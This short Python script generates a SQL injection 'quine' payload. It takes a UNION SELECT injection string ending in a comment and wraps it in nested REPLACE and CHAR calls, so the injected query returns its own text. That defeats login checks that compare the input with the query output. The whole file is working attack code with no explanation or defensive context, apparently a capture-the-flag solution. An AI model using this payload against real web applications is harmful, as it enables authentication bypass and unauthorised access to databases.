def quine(data):
    data = data.replace('$$', "REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)")
    blob = data.replace('$$', '"$"').replace("'", '"')
    data = data.replace('$$', "'" + blob + "'")
    print(data)

quine("' UNION Select $$ -- -")

